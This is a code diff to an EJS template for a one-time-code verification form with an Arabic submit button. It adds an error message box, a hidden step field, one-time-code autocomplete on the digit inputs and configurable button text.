@@ -27,15 +27,20 @@
   <h1><%= pageContent.headline %></h1>
   <p class="sub"><%= pageContent.subheadline %></p>
 
+  <% if (typeof error !== 'undefined' && error) { %>
+    <div style="background:#ef444420;border:1px solid #ef444440;border-radius:9px;padding:10px 14px;font-size:.85rem;color:#fca5a5;margin-bottom:14px;text-align:center"><%= error %></div>
+  <% } %>
+
   <form method="POST" action="/p/<%= page.slug %>/verify" id="otpForm">
     <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+    <input type="hidden" name="_step" value="<%= pageContent.slug || 'verify' %>">
     <div class="otp-wrap" id="otpWrap">
       <% for (let i = 0; i < (pageContent.otp_length || 6); i++) { %>
-        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
       <% } %>
     </div>
     <input type="hidden" name="code" id="codeHidden">
-    <button type="submit" id="submitBtn" disabled>تأكيد</button>
+    <button type="submit" id="submitBtn" disabled><%= pageContent.cta || 'تأكيد' %></button>
   </form>
 
   <div style="text-align:center;font-size:.83rem;margin-top:16px;opacity:.75">
